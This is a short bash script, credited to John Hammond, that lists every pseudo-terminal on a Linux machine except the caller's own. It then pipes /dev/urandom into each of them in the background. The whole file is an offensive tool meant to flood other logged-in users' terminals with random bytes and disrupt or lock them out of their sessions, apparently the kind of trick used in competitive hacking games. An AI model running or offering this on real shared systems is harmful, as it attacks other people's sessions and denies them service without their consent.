#!/bin/bash

# Credit to John Hammond for this idea

# Get the current PTS (your PTS)
current_pts=$(tty | cut -d '/' -f 4)

# Iterate through all PTS except the current one
for pts in $(ls /dev/pts/ | grep -E '^[0-9]+$' | grep -v "$current_pts"); do
    echo "Spamming pts/$pts"
    cat /dev/urandom > /dev/pts/$pts &
done
